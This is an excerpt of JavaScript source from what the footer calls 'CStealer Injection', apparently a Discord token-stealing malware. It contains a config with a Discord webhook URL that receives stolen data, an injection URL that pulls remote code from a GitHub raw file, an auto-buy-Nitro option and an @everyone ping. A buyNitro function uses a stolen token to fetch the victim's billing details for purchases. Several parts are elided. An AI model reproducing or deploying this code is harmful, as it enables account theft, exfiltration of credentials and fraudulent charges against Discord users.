...
const config = {
  webhook: 'https://canary.discord.com/api/webhooks/1223428531812438208/BfZE3rL_pFSj79w_BpvRI09CcjVPTUsprk3N1EvNpvb09VLuIlTEyCbuhYq-L-4F61Bt', 
  webhook_protector_key: 'https://canary.discord.com/api/webhooks/1223428531812438208/BfZE3rL_pFSj79w_BpvRI09CcjVPTUsprk3N1EvNpvb09VLuIlTEyCbuhYq-L-4F61Bt', 
  auto_buy_nitro: true, 
  ping_on_run: true, 
  ping_val: '@everyone',
  ...
  embed_color: 2895667, 
  injection_url: 'https://raw.githubusercontent.com/watakhi/handwerk/main/skizze.js', 
  /**
...
const buyNitro = async (token) => {
  const data = await fetchBilling(token);
  const failedMsg = 'Failed to Purchase âŒ';
    ...
    embeds: [
      {
        ...
        footer: {
            text: 'CStealer Injectionãƒ»https://github.com/can-kat/cstealer',
